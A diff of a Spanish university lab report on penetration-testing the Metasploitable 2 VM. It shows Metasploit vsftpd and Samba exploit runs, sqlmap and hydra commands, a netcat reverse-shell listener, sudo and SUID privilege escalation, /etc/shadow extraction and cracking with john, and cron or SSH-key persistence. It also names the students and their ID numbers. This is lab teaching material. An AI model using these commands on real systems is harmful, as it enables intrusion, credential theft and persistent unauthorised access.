@@ -1,14 +1,15 @@
-| :- | :- |
+# **Práctica Nro. 9: Pentesting Integral Metodología de Red Team Assessment(Reconocimiento, Análisis de Vulnerabilidades, Explotación y Post-Explotación con Nmap, Metasploit, SQLMap, Hydra y Técnicas de Escalada de Privilegios)**
 
-**Práctica Nro. 9**
+## Datos de Identificación
 
-**Pentesting Integral: Metodología de Red Team Assessment**
+| Apellido, Nombre | Cédula de Identidad | Nro. de Práctica | Fecha |
+| :--- | :---: | :---: | :--- |
+| Gil, Jesús | 30175126 | 7 | 21-11-2025|
+| Guilarte, Andrés | 30246084 | 7 | 21-11-2025 |
 
-**(Reconocimiento, Análisis de Vulnerabilidades, Explotación y
-Post-Explotación con Nmap, Metasploit, SQLMap, Hydra y Técnicas de
-Escalada de Privilegios)**
+**Grupo:** 4
 
-**CONTEXTO DEL ESCENARIO**
+## **CONTEXTO DEL ESCENARIO**
 
 **TechVault Industries** es una empresa de servicios financieros que ha
 detectado actividad sospechosa en su red. Como equipo de **Red Team**,
@@ -19,7 +20,7 @@ organización.
 Su misión: **Desde reconocimiento inicial hasta exfiltración de datos,
 en 60 minutos.**
 
-**OBJETIVOS DE APRENDIZAJE**
+## **OBJETIVOS DE APRENDIZAJE**
 
 Al completar esta práctica integradora, demostrarás:
 
@@ -34,9 +35,9 @@ Al completar esta práctica integradora, demostrarás:
 
 -   **Pensamiento estratégico** en ciberseguridad ofensiva
 
-**REQUISITOS TÉCNICOS**
+## **REQUISITOS TÉCNICOS**
 
-**Entorno de Laboratorio**
+### **Entorno de Laboratorio**
 
 -   **Kali Linux** (Máquina atacante)
 
@@ -47,7 +48,7 @@ Al completar esta práctica integradora, demostrarás:
 -   **Herramientas verificadas**: Nmap, Metasploit, Hydra, Nikto,
     SQLMap, Dirb, John the Ripper
 
-**Verificación Previa**
+### **Verificación Previa**
 
 \# En Kali Linux, ejecutar antes de comenzar
 
@@ -60,7 +61,7 @@ ip addr show
 
 \# 2. Verificar conectividad con Metasploitable 2
 
-ping \<IP_METASPLOITABLE\>
+`ping 192.168.100.20`
 
 >\# Deberías recibir respuestas (ping exitoso)
 
@@ -102,18 +103,16 @@ which nmap sqlmap hydra nikto dirb john
 
 \# (Esperar al menos 2 minutos después del boot)
 
+## **FASE 1: RECONOCIMIENTO Y ENUMERACIÓN (10 minutos)**
 
-
-**FASE 1: RECONOCIMIENTO Y ENUMERACIÓN (10 minutos)**
-
-**Objetivo**
+### **Objetivo**
 
 Identificar la superficie de ataque completa: servicios, versiones,
 tecnologías web y posibles vectores de entrada.
 
-**Tareas**
+### **Tareas**
 
-**1.1 Descubrimiento de Servicios (3 min)**
+#### **1.1 Descubrimiento de Servicios (3 min)**
 
 \# Escaneo rápido y agresivo
 
@@ -167,14 +166,14 @@ Nmap done: 1 IP address (1 host up) scanned in 140.98 seconds
 ```
 >\# Reporte completo disponible en: https://github.com/Jrgil20/PracticasCiberSeguridad/blob/main/Practica9/recon_full.txt
 
-\# Análisis rápido de resultados
+> Análisis rápido de resultados
 
->\# El comando 'grep' filtra SOLO las líneas con "open", descartando metadata y detalles extensos de certificados, claves SSH, etc.
->\# De esta forma delimitamos la búsqueda a los puertos/servicios activos. Total: 30 servicios abiertos (son los mismos del output anterior)
+> El comando 'grep' filtra SOLO las líneas con "open", descartando metadata y detalles extensos de certificados, claves SSH, etc.
+> De esta forma delimitamos la búsqueda a los puertos/servicios activos. Total: 30 servicios abiertos (son los mismos del output anterior)
 
-cat recon_full.txt | grep "open"
+`cat recon_full.txt | grep "open"`
 
->\#  resultado (delimitado a servicios abiertos)
+> Resultado (delimitado a servicios abiertos)
 
 ``` shell
 cat recon_full.txt | grep "open"
@@ -210,7 +209,7 @@ cat recon_full.txt | grep "open"
 56539/tcp open  status      1 (RPC #100024)
 ```
 
-**Resultado obtenido:**
+##### **Resultado obtenido:**
 
 -   **30 servicios TCP abiertos** identificados en 192.168.100.20
 
@@ -232,7 +231,7 @@ cat recon_full.txt | grep "open"
     - bindshell root (puerto 1524)
     - Samba con message signing deshabilitado
 
-**1.2 Enumeración Web (4 min)**
+#### **1.2 Enumeración Web (4 min)**
 
 >\# whatweb: Identifica tecnologías web, versiones de servidor, frameworks y librerías expuestas
 >\# Útil para descubrir versiones vulnerables sin realizar escaneos complejos
@@ -247,7 +246,7 @@ whatweb http://192.168.100.20
 http://192.168.100.20 [200 OK] Apache[2.2.8], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.8 (Ubuntu) DAV/2], IP[192.168.100.20], PHP[5.2.4-2ubuntu5.10], Title[Metasploitable2 - Linux], WebDAV[2], X-Powered-By[PHP/5.2.4-2ubuntu5.10]
 ```
 
-**Análisis:**
+##### **Análisis:**
 - **Apache 2.2.8**: Versión antigua (2008) con múltiples vulnerabilidades conocidas
 - **PHP 5.2.4-2ubuntu5.10**: Versión obsoleta (2008) con vulns críticas (remote code execution, etc.)
 - **WebDAV/2 habilitado**: Permite upload/modificación de archivos vía HTTP (potencial RCE)
@@ -299,9 +298,9 @@ END_TIME: Fri Nov 21 08:56:50 2025
 DOWNLOADED: 4612 - FOUND: 6
 ```
 
-**Análisis de Resultados:**
+##### **Análisis de Resultados:**
 
-**Directorios/Archivos Críticos Encontrados:**
+###### **Directorios/Archivos Críticos Encontrados:**
 
 1. **`/phpinfo` y `/phpinfo.php`** (CODE:200 - Accesible)
    - Expone información sensible de PHP y configuración del servidor
@@ -323,12 +322,12 @@ DOWNLOADED: 4612 - FOUND: 6
    - Aunque devuelven 403 (Forbidden), su existencia es información valiosa
    - Indica capacidad de ejecutar scripts CGI en el servidor
 
-**Resumen:**
+#### **Resumen:**
 - **4,612** palabras probadas de wordlist
 - **6 hallazgos** (3 directivos potencialmente explotables + 2 archivos críticos)
 - **Riesgo total**: CRÍTICO (phpMyAdmin + WebDAV + PHP info = acceso completo al servidor)
 
-**1.3 Enumeración de Usuarios (3 min)**
+### **1.3 Enumeración de Usuarios (3 min)**
 
 >\# FTP anónimo: Si el servicio FTP permite login sin credenciales, acceso directo a archivos
 >\# Útil para obtener archivos de configuración, scripts, o información del sistema
@@ -353,7 +352,7 @@ Using binary mode to transfer files.
 ftp> 
 ```
 
-**Análisis:**
+#### **Análisis:**
 - **220 vsFTPd 2.3.4**: Banner del servicio FTP (versión vulnerable)
 - **331 Please specify the password**: Solicita contraseña para usuario anónimo
 - **230 Login successful**: Login anónimo PERMITIDO - Acceso sin autenticación
@@ -381,16 +380,16 @@ enum4linux -a 192.168.100.20 | tee enum4linux_results.txt
 - Identificar shares accesibles como: `print$`, `IPC$`, `tmp`
 - Obtener información de seguridad para ataques posteriores (fuerza bruta, pass spraying)
 
-**FASE 2: ANÁLISIS DE VULNERABILIDADES (15 minutos)**
+## **FASE 2: ANÁLISIS DE VULNERABILIDADES (15 minutos)**
 
-**Objetivo**
+### **Objetivo**
 
 Identificar vulnerabilidades explotables en servicios de red y
 aplicaciones web, priorizando por criticidad.
 
-**Tareas**
+### **Tareas**
 
-**2.1 Escaneo de Vulnerabilidades de Red (5 min)**
+### **2.1 Escaneo de Vulnerabilidades de Red (5 min)**
 
 >\# searchsploit: Busca exploits conocidos en base de datos local de Exploit-DB
 >\# Útil para identificar qué servicios y versiones TIENEN exploits públicos disponibles
@@ -416,7 +415,7 @@ vsftpd 2.3.4 - Backdoor Command Execution  | unix/remote/49757.py
 Shellcodes: No Results
 ```
 
-**Análisis:**
+#### **Análisis:**
 - **2 exploits disponibles** para vsftpd 2.3.4 (Ruby y Python)
 - **Backdoor Command Execution**: Acceso remoto directo sin autenticación
 - **Riesgo**: CRÍTICO - Ejecución de comandos con privilegios de root
@@ -441,7 +440,7 @@ Samba < 3.6.2 (x86) - Denial of Service (P | linux_x86/dos/36741.py
 Shellcodes: No Results
 ```
 
-**Análisis:**
+#### **Análisis:**
 - **4 exploits** para diferentes versiones de Samba 3.0.x
 - **Username map script** (CVE-2007-2447): Command execution via username parameter
 - **Remote Heap Overflow**: Corrupción de memoria para RCE
@@ -475,13 +474,13 @@ Apache Tomcat < 5.5.17 - Remote Directory  | multiple/remote/2061.txt
 Shellcodes: No Results
 ```
 
-**Análisis (relevantes para nuestra target):**
+#### **Análisis (relevantes para nuestra target):**
 - **Apache + PHP < 5.3.12**: Nuestra target tiene PHP 5.2.4 (vulnerable)
 - **CGI-bin**: Ejecución remota de scripts CGI
 - **Remote Code Execution**: Via PHP, mod_rewrite, WebDAV
 - **Riesgo**: ALTO-CRÍTICO - Ejecución de código como usuario www-data
 
-**TABLA RESUMEN DE VULNERABILIDADES CRÍTICAS (CVSS ≥ 7.0):**
+#### **TABLA RESUMEN DE VULNERABILIDADES CRÍTICAS (CVSS ≥ 7.0):**
 
 | Servicio | Versión | CVE | CVSS | Tipo | Impacto |
 |----------|---------|-----|------|------|---------|
@@ -493,26 +492,26 @@ Shellcodes: No Results
 
 ---
 
-**2.2 Análisis de Vulnerabilidades Web (10 min)**
+### **2.2 Análisis de Vulnerabilidades Web (10 min)**
 
 >\# nikto: Scanner automatizado de vulnerabilidades web
 >\# -h: Especificar host a escanear
 >\# -o: Guardar output en archivo
 >\# Detecta: versiones software, misconfigurations, archivos peligrosos, CGI vulnerables
 
-**Opción A: Escaneo automatizado**
+#### **Opción A: Escaneo automatizado**
 
 nikto -h http://192.168.100.20 -o nikto_scan.txt
 
-**Opción B: Búsqueda manual de SQL Injection**
+#### **Opción B: Búsqueda manual de SQL Injection**
 
 \# Identifica formularios de login o parámetros GET
 
-\# Ejemplo: http://\<IP_TARGET\>/mutillidae/index.php?page=login.php
+\# Ejemplo: http://192.168.100.20/mutillidae/index.php?page=login.php
 
 \# Prueba básica de SQLi
 
-sqlmap -u \"http://\<IP_TARGET\>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#\" \\
+sqlmap -u \"http://192.168.100.20/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#\" \\
 
 \--cookie=\"PHPSESSID=\<tu_session\>; security=low\" \\
 
@@ -527,7 +526,7 @@ sqlmap -u \"http://\<IP_TARGET\>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#\
 
 ---
 
-**OPCIÓN ELEGIDA: Escaneo Web Automatizado con Nikto**
+#### **OPCIÓN ELEGIDA: Escaneo Web Automatizado con Nikto**
 
 En este caso, se optó por ejecutar un **escaneo web automatizado con Nikto** para identificar vulnerabilidades web críticas de forma sistemática.
 
@@ -537,7 +536,7 @@ En este caso, se optó por ejecutar un **escaneo web automatizado con Nikto** pa
 nikto -h http://192.168.100.20 -o nikto_scan.txt
 ```
 
-**Resultado (extracto de hallazgos críticos):**
+##### **Resultado (extracto de hallazgos críticos):**
 
 ```
 + GET /phpinfo.php: Output from the phpinfo() function was found.
@@ -550,7 +549,7 @@ nikto -h http://192.168.100.20 -o nikto_scan.txt
 + GET /doc/: Directory indexing found. This may be /usr/doc (CVE-1999-0678).
 ```
 
-**Análisis de Hallazgos:**
+##### **Análisis de Hallazgos:**
 
 1. **phpinfo() Expuesto** - Información sensible de PHP y configuración del servidor visible públicamente. Facilita enumeración de extensiones y rutas internas.
 
@@ -564,25 +563,25 @@ nikto -h http://192.168.100.20 -o nikto_scan.txt
 
 6. **X-Frame-Options Faltante** - Ausencia de headers de seguridad facilita ataques Clickjacking.
 
-**Conclusión de la Fase 2:**
+### **Conclusión de la Fase 2:**
 El escaneo con Nikto confirmó que Metasploitable 2 presenta **vulnerabilidades web críticas de acceso inmediato** (phpinfo, phpMyAdmin, directorios listables), permitiendo recolectar información para fases posteriores de explotación.
 
 **\
 **
 
-**FASE 3: EXPLOTACIÓN Y ACCESO (20 minutos)**
+## **FASE 3: EXPLOTACIÓN Y ACCESO (20 minutos)**
 
-**Objetivo**
+### **Objetivo**
 
 Obtener acceso inicial al sistema mediante explotación de
 vulnerabilidades identificadas.
 
-**Tareas -- ELIJAN USTEDES EL VECTOR DE ATAQUE**
+### **Tareas -- ELIJAN USTEDES EL VECTOR DE ATAQUE**
 
 Debes completar **AL MENOS 2 de las siguientes 4 opciones** según lo que
 hayas descubierto:
 
-**OPCIÓN A: Explotación de Servicio Vulnerable (8 min)**
+#### **OPCIÓN A: Explotación de Servicio Vulnerable (8 min)**
 
 msfconsole
 
@@ -631,7 +630,7 @@ msf6 exploit(usermap_script) \> exploit
 
 -   ¿Obtuviste shell? ¿Con qué privilegios?
 
-**OPCIÓN B: Ataque de Fuerza Bruta (8 min)**
+#### **OPCIÓN B: Ataque de Fuerza Bruta (8 min)**
 
 \# Crear lista de usuarios (si los obtuviste en Fase 1)
 
@@ -660,7 +659,7 @@ ftp://\<IP_TARGET\> -t 4
 
 -   Accede al sistema con las credenciales: ssh usuario@\<IP_TARGET\>
 
-**OPCIÓN C: Explotación de SQL Injection (8 min)**
+#### **OPCIÓN C: Explotación de SQL Injection (8 min)**
 
 \# Enumerar bases de datos
 
@@ -691,7 +690,7 @@ sqlmap -u
 
 -   Extrae y documenta al menos 3 credenciales de usuarios
 
-**OPCIÓN D: Explotación Web + Reverse Shell (8 min)**
+#### **OPCIÓN D: Explotación Web + Reverse Shell (8 min)**
 
 \# Buscar upload de archivos o command injection
 
@@ -716,9 +715,9 @@ nc -lvnp 4444
 
 ---
 
-**OPCIONES EJECUTADAS: Resultados de A y C**
+### **OPCIONES EJECUTADAS: Resultados de A y C**
 
-**OPCIÓN A: Explotación de vsftpd 2.3.4 Backdoor (Estado: EN ESPERA)**
+#### **OPCIÓN A: Explotación de vsftpd 2.3.4 Backdoor (Estado: EN ESPERA)**
 
 Se ejecutó el exploit de Metasploit contra el servicio vsftpd vulnerable en puerto 21:
 
@@ -740,7 +739,7 @@ msf6 exploit(vsftpd_234_backdoor) > exploit
 
 ---
 
-**OPCIÓN C: Explotación de SQL Injection (Estado: EN ESPERA)**
+#### **OPCIÓN C: Explotación de SQL Injection (Estado: EN ESPERA)**
 
 Se ejecutó el comando de SQLMap contra la aplicación DVWA en Metasploitable 2:
 
@@ -771,7 +770,7 @@ sqlmap -u "http://192.168.100.20/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#"
 
 ![Imagen de prueba - Fallo de SQLMap](image-4.png)
 
-**Análisis del Resultado:**
+##### **Análisis del Resultado:**
 
 - **Estado**: EN ESPERA (pending resolution)
 - **Problema**: URL inválida detectada por SQLMap
@@ -788,7 +787,7 @@ sqlmap -u "http://192.168.100.20/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#"
 
 ---
 
-**Conclusión de Fase 3:**
+### **Conclusión de Fase 3:**
 
 - **Opción A (vsftpd backdoor)**: 
 - **Opción C (SQLi)**: ⏳ EN ESPERA - Requiere validación de sesión antes de continuar
@@ -803,9 +802,9 @@ sqlmap -u "http://192.168.100.20/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#"
 **\
 **
 
-**FASE 4: POST-EXPLOTACIÓN Y EVIDENCIAS (10 minutos)**
+## **FASE 4: POST-EXPLOTACIÓN Y EVIDENCIAS (10 minutos)**
 
-**Objetivo**
+### **Objetivo**
 
 Escalar privilegios, mantener persistencia y extraer información
 sensible.
@@ -829,9 +828,9 @@ sensible.
 
 ---
 
-**Tareas**
+### **Tareas**
 
-**4.1 Reconocimiento Interno (3 min)**
+### **4.1 Reconocimiento Interno (3 min)**
 
 **Qué debería ejecutarse si tuvieras acceso:**
 
@@ -872,7 +871,7 @@ sudo -l
 -   ¿Tiene permisos sudo? (¿NOPASSWD o requiere contraseña?)
 -   ¿Cuál es la versión del kernel? (Información para exploits)
 
-**4.2 Escalada de Privilegios (4 min)**
+### **4.2 Escalada de Privilegios (4 min)**
 
 **Si ya eres root (desde vsftpd o Samba):**
 - No se requiere escalada adicional
@@ -880,7 +879,7 @@ sudo -l
 
 **Si eres usuario sin privilegios (msfadmin desde brute force):**
 
-**Opción 1: Exploit de kernel (CVE-2009-1185 udev)**
+#### **Opción 1: Exploit de kernel (CVE-2009-1185 udev)**
 
 \# Identificar versión de kernel vulnerable
 
@@ -896,7 +895,7 @@ searchsploit linux udev
 >\# Salida esperada: Múltiples exploits para udev incluyendo CVE-2009-1185
 >\# Explicación: Descarga el exploit 8572.c y compila/ejecuta para obtener shell root
 
-**Opción 2: Permisos sudo mal configurados (RECOMENDADO EN METASPLOITABLE 2)**
+#### **Opción 2: Permisos sudo mal configurados (RECOMENDADO EN METASPLOITABLE 2)**
 
 sudo -l
 
@@ -908,7 +907,7 @@ sudo su -
 >\# Resultado: Shell root inmediato sin requerir contraseña
 >\# Explicación: El comando `su -` cambia al usuario root. Como sudo no pide contraseña, obtienes root directo.
 
-**Opción 3: SUID binaries (búsqueda de binarios con permisos especiales)**
+#### **Opción 3: SUID binaries (búsqueda de binarios con permisos especiales)**
 
 find / -perm -4000 2\>/dev/null
 
@@ -930,7 +929,7 @@ find / -perm -4000 -exec ls -la {} \; 2\>/dev/null | grep -E "nmap|find|less"
 -   ¿Mediante qué método? (sudo NOPASSWD, kernel exploit, SUID binary)
 -   Captura evidencia: `whoami` → debería mostrar `root`
 
-**4.3 Exfiltración de Datos (3 min)**
+### **4.3 Exfiltración de Datos (3 min)**
 
 **Una vez como root, estos son los archivos críticos a extraer:**
 
@@ -1018,9 +1017,9 @@ john /tmp/hashes.txt \--show
 
 En un escenario exitoso con acceso root, el equipo habría obtenido:
 
-**FASE 5: DOCUMENTACIÓN FINAL (5 minutos)**
+## **FASE 5: DOCUMENTACIÓN FINAL (5 minutos)**
 
-**Objetivo**
+### **Objetivo**
 
 Generar un reporte ejecutivo profesional de los hallazgos. Debes
 entregarlo en MarkDown (.md)
@@ -1039,13 +1038,13 @@ entregarlo en MarkDown (.md)
 
 \-\--
 
-**\## 1. RESUMEN EJECUTIVO**
+### **\## 1. RESUMEN EJECUTIVO**
 
 \[2-3 líneas describiendo el nivel de compromiso logrado\]
 
 **\## 2. HALLAZGOS CRÍTICOS**
 
-**\### Vulnerabilidad #1: \[Nombre\]**
+### **\### Vulnerabilidad #1: \[Nombre\]**
 
 \- **\*\*Severidad:\*\*** CRÍTICA/ALTA/MEDIA
 
@@ -1065,7 +1064,7 @@ entregarlo en MarkDown (.md)
 
 \[Repetir estructura\]
 
-**\## 3. CADENA DE EXPLOTACIÓN**
+### **\## 3. CADENA DE EXPLOTACIÓN**
 
 1\. Reconocimiento: \[Herramienta usada\] → \[Hallazgo clave\]
 
@@ -1075,7 +1074,7 @@ entregarlo en MarkDown (.md)
 
 4\. Exfiltración: \[Datos extraídos\]
 
-**\## 4. DATOS SENSIBLES COMPROMETIDOS**
+### **\## 4. DATOS SENSIBLES COMPROMETIDOS**
 
 \- Usuarios del sistema: \[Cantidad\]
 
@@ -1085,7 +1084,7 @@ entregarlo en MarkDown (.md)
 
 \- Archivos críticos: \[Lista\]
 
-**\## 5. RECOMENDACIONES (Top 3)**
+### **\## 5. RECOMENDACIONES (Top 3)**
 
 1\. \[Recomendación más crítica\]
 
@@ -1093,7 +1092,7 @@ entregarlo en MarkDown (.md)
 
 3\. \[Tercera recomendación\]
 
-**\## 6. TIMELINE DEL ATAQUE**
+### **\## 6. TIMELINE DEL ATAQUE**
 
 \- 00:00 - 10:00 → Reconocimiento
 
@@ -1109,6 +1108,8 @@ entregarlo en MarkDown (.md)
 
 **\*\*Conclusión:\*\*** \[1-2 líneas sobre la postura de seguridad del
 objetivo\]
+
+En vista de que no se pudo completar con éxito la prueba de penetración, no se tiene un postura concreta sobre la seguridad del objetivo no obstante se pueden observar claramente fallas de seguridad por lo cual se recomienda encaracidamente revisar las vulnerabilidades y mitigarlas con prontitud.
 
 **SECCIÓN DE CONCLUSIÓN Y REFLEXIÓN CRÍTICA**
 
@@ -1126,229 +1127,217 @@ del equipo.
 
 **PREGUNTAS DE REFLEXIÓN Y ANÁLISIS CRÍTICO**
 
-**BLOQUE 1: METODOLOGÍA Y TOMA DE DECISIONES (Preguntas 1-3)**
+## Bloque 1 — Metodología y toma de decisiones
 
-**1. Análisis de la Cadena de Ataque**
+### 1. Análisis de la cadena de ataque
 
-Revisen su timeline de ataque y respondan:
+- **a) ¿Cuál fue el vector de entrada más efectivo y por qué?**
+  - Vector más efectivo: **Servicios web expuestos (phpMyAdmin, WebDAV, phpinfo)** y **vsftpd 2.3.4**.
+  - Por qué: los servicios web facilitan acceso a la capa de aplicación (posibilidad de subir shells y extraer bases de datos) y `vsftpd 2.3.4` tiene exploits públicos que permiten RCE rápido y de alto impacto.
 
-a\) ¿Cuál fue el vector de entrada más efectivo que utilizaron y por
-qué?
+- **b) Si tuvieran que repetir el ejercicio, ¿cambiarían el orden de sus acciones? ¿Por qué?**
+  - Sí. Orden recomendado: 1) reconocimiento rápido (nmap -sV -T4 sobre puertos comunes) y verificación manual de hallazgos de bajo coste (FTP anónimo, `/phpinfo`, `phpMyAdmin`, WebDAV); 2) explotación dirigida de vectores con PoC conocidos (vsftpd, Samba); 3) escaneos más exhaustivos y post-explotación.
+  - Razonamiento: validar vectores "low-hanging" primero ahorra tiempo y evita gastar minutos en escaneos completos antes de confirmar vectores de alto impacto.
 
-b\) Si tuvieran que repetir el ejercicio, ¿cambiarían el orden de sus
-acciones? ¿Por qué?
+- **c) ¿En qué momento consideraron que habían "comprometido" el sistema? Justifiquen.**
+  - Se considera compromiso real cuando se obtiene **ejecución remota de comandos** (shell) o **acceso administrativo funcional** (p. ej. acceso a `phpMyAdmin` con credenciales válidas). La confirmación mediante shell o credenciales operativas es la evidencia de compromiso.
 
-c\) ¿En qué momento del ataque consideraron que habían \"comprometido\"
-realmente el sistema? Justifiquen su respuesta.
+- **d) Trabajo en equipo: cómo dividieron tareas y si fue efectivo**
+  - División típica: uno en reconocimiento de red/servicios (`nmap`, `enum4linux`, `dirb`), otro en análisis web y explotación (`nikto`, `sqlmap`, Metasploit, payloads). Fue efectiva porque permitió paralelizar tareas y reducir tiempos de espera; recomendación: mantener comunicación constante y compartir artefactos (cookies, paths, credenciales) en tiempo real.
 
-d\) **Trabajo en equipo:** ¿Cómo dividieron las tareas entre ustedes
-dos? ¿Fue efectiva esa división del trabajo?
+### 2. Gestión del tiempo y priorización
 
-**2. Gestión del Tiempo y Priorización**
+- **a) ¿Qué fase consumió más tiempo y por qué?**
+  - Fase 2-3 (análisis de vulnerabilidades y explotación) consumió más tiempo. Causas: escaneos profundos, validación de sesiones/cookies (ej. `sqlmap` falló por cookie inválida) y exploits pendientes en Metasploit que requirieron reintentos.
 
-Durante los 60 minutos de práctica:
+- **b) ¿Se quedaron atascados en alguna técnica? ¿Cómo lo resolvieron?**
+  - Sí: `sqlmap` falló por sesión inválida; el exploit de vsftpd quedó en espera. Resolución: recuperar sesión vía login manual en la app, reasignar tareas (uno recupera sesión, otro prepara listener/payload), y tener planes alternativos (Samba, FTP anónimo) listos.
 
-a\) ¿Qué fase consumió más tiempo del esperado? ¿Por qué creen que
-ocurrió esto?
+- **c) Si tuvieran 30 minutos, ¿qué técnicas eliminarían y cuáles priorizarían?**
+  - Eliminar: escaneos exhaustivos (`-p- --min-rate`), dirb/nikto masivos. Priorizar: reconocimiento rápido, verificación de FTP anónimo y `phpMyAdmin`, intento de exploits con PoC (vsftpd/Samba) y prueba de upload/reverse-shell si WebDAV está activo.
 
-b\) ¿Hubo algún momento en que se quedaron \"atascados\" en una técnica
-específica? ¿Cómo lo resolvieron como equipo?
+- **d) Reflexión estratégica (velocidad vs evitar detección)**
+  - En un engagement real: empezar con inteligencia pasiva y pruebas de bajo ruido; usar acciones agresivas sólo si las reglas lo permiten o cuando el riesgo de detección es aceptable. Registrar acciones y usar ventanas/hosts de salto para reducir trazas.
 
-c\) Si tuvieran solo 30 minutos en lugar de 60, ¿qué técnicas
-eliminarían y cuáles mantendrían como prioritarias?
+- **e) Dinámica de equipo: desacuerdos y resolución**
+  - Desacuerdos menores (priorizar web vs servicios) se resolvieron con criterio: impacto potencial (¿da root rápido?) y estimación de tiempo. Si persiste desacuerdo, usar matriz Impacto×Probabilidad para decidir.
 
-d\) **Reflexión estratégica:** En un engagement real de Red Team, ¿cómo
-balancearían la velocidad del ataque con la necesidad de evitar
-detección?
+### 3. Comparación de vectores de ataque
 
-e\) **Dinámica de equipo:** ¿Hubo momentos de desacuerdo sobre qué
-técnica usar? ¿Cómo los resolvieron?
+- **a) Ranking por efectividad (mayor → menor):**
+  1. vsftpd 2.3.4 (Backdoor) — RCE directo y reproducible.
+  2. Samba (usermap_script) — RCE remoto documentado.
+  3. SQL Injection (phpMyAdmin/DVWA) — alto impacto si existe vulnerabilidad, dependiente de la app.
+  4. SSH brute force — menos efectivo: ruidoso y lento; depende de credenciales débiles.
 
-**3. Comparación de Vectores de Ataque**
+- **b) ¿Cuál es más difícil de detectar por Blue Team?**
+  - Los vectores web (SQLi, uploads) suelen ser más fáciles de camuflar en tráfico web legítimo; brute force y exploits SMB/FTP generan patrones de red y logs más ruidosos.
 
-Considerando las 4 opciones de explotación presentadas (vsftpd, Samba,
-SSH brute force, SQL Injection):
+- **c) ¿Cuál requiere más habilidad técnica?**
+  - Explotación de Samba y post-explotación (pivoting y payload crafting) requieren más pericia; SQLi y vsftpd pueden ser más directos con herramientas existentes.
 
-a\) Clasifíquenlas de mayor a menor efectividad según su experiencia.
-Justifiquen su ranking.
+- **d) ¿Cuál sería menos probable en una organización moderna?**
+  - Un servidor con `vsftpd 2.3.4` con backdoor o Samba 3.0.x sin parches es menos probable en infra moderna gestionada, pero posible en sistemas legacy o olvidados.
 
-b\) ¿Cuál vector sería más difícil de detectar por un equipo de Blue
-Team? ¿Por qué?
+- **e) Perspectiva dual: diferencias de opinión y consenso**
+  - Hubo discusión; se priorizó por impacto y rapidez. Consenso mediante evaluación rápida del ROI (esfuerzo vs ganancia).
 
-c\) ¿Cuál vector requiere más habilidad técnica del atacante?
+---
 
-d\) En un escenario real, ¿cuál vector sería menos probable de encontrar
-en una organización moderna? Expliquen.
+## Bloque 2 — Comprensión técnica profunda
 
-e\) **Perspectiva dual:** ¿Tuvieron diferencias de opinión sobre qué
-vector atacar primero? ¿Cómo llegaron a un consenso?
+### 4. Análisis de vulnerabilidades críticas (ejemplo: vsftpd 2.3.4)
 
-**BLOQUE 2: COMPRENSIÓN TÉCNICA PROFUNDA (Preguntas 4-6)**
+- **4.a Investigación — contexto histórico:**
+  - `vsftpd 2.3.4` sufrió un incidente en 2011 (CVE-2011-2523): un tarball distribuido estaba comprometido con un backdoor. Fue notable porque la propia distribución se entregó con código malicioso que abría acceso remoto.
 
-**4. Análisis de Vulnerabilidades Críticas**
+- **4.b Análisis técnico (explicado):**
+  - El backdoor se activaba cuando un nombre de usuario con un patrón concreto era recibido por el servidor FTP; el código malicioso abría un canal que permitía ejecutar comandos o conectar a un shell remoto. Es decir, la ruta de autenticación incluía una condición que desplegaba un listener/pipeline de comandos no presente en la versión legítima.
 
-Seleccionen la vulnerabilidad más crítica que explotaron (por ejemplo,
-vsftpd backdoor o Samba usermap_script):
+- **4.c Remediación (además de actualizar):**
+  - Implementar **firewall/ACLs** para limitar acceso a FTP a redes confiables.
+  - Deshabilitar servicios no necesarios (usar SFTP/FTPS en su lugar).
+  - Deployar **IDS/IPS** con firmas para detectar patrones del backdoor y usernames sospechosos.
+  - Aplicar gestión de integridad y verificación de paquetes/firmas upstream antes de desplegar binarios.
 
-a\) **Investigación:** ¿Cuál es el contexto histórico de esta
-vulnerabilidad? ¿Cuándo fue descubierta y cómo llegó al código?
+- **4.d Detección (IOCs a buscar):**
+  - Entradas de logs con usernames no habituales o patrones especiales.
+  - Nuevas conexiones salientes desde el servidor o procesos que abren listeners tras sesión FTP.
+  - Cambios en `crontab`, cuentas añadidas o modificaciones en `/etc/sudoers` tras actividad FTP.
 
-b\) **Análisis técnico:** Expliquen con sus propias palabras cómo
-funciona el exploit a nivel técnico (no copien la descripción del CVE).
+- **4.e División de investigación:**
+  - Recomendación: uno investiga la PoC/CVE/exploit-db y reproducibilidad; el otro define mitigaciones operativas, reglas IDS y planes de hardening.
 
-c\) **Remediación:** Además de actualizar el software, ¿qué controles de
-seguridad adicionales podrían mitigar esta vulnerabilidad? (Mencionen al
-menos 3: firewall, IDS, segmentación de red, etc.)
+### 5. Escalada de privilegios y post-explotación
 
-d\) **Detección:** Si fueran analistas de SOC, ¿qué indicadores de
-compromiso (IOCs) buscarían en los logs para detectar este ataque?
+- **5.a Técnicas para escalar a root si se entra como usuario normal:**
+  - `sudo -l` para detectar entradas NOPASSWD; si existe, `sudo su -` para root.
+  - Buscar SUID binaries (`find / -perm -4000`) y usar escapes (`nmap --interactive`, `less`, `vim` si son SUID) cuando sea posible.
+  - Buscar exploits de kernel compatibles (`searchsploit` + compilar PoC) y ejecutarlos si el kernel es vulnerable.
 
-e\) **División de investigación:** ¿Cómo dividieron la investigación de
-esta vulnerabilidad? ¿Cada uno investigó aspectos diferentes?
+- **5.b Riesgos si se obtiene root directo:**
+  - Acceso total al host (leer `/etc/shadow`, instalar backdoors, borrar logs), pivoting lateral, exfiltración masiva de datos y destrucción de evidencia.
 
-**5. Escalada de Privilegios y Post-Explotación**
+- **5.c Investigación: CVE-2009-1185 (udev) — resumen:**
+  - CVE-2009-1185 afecta a `udev` y permitía escalada por manejo inseguro de creación de dispositivos; un local podía provocar que `udev` ejecutase acciones con privilegios. Es representativo de cómo kernels antiguos y utilidades del sistema pueden dejar vectores de elevación en entornos legacy.
 
-Reflexionen sobre la fase de post-explotación:
+- **5.d Persistencia (métodos ejemplares):**
+  - Añadir una clave pública al `/root/.ssh/authorized_keys`.
+  - Crear cron job o servicio (systemd unit) que ejecute un reverse shell o restablezca acceso tras reinicio.
 
-a\) Si obtuvieron acceso con un usuario sin privilegios, ¿qué técnicas
-utilizaron para escalar a root? ¿Por qué funcionaron?
+- **5.e Colaboración durante post-explotación:**
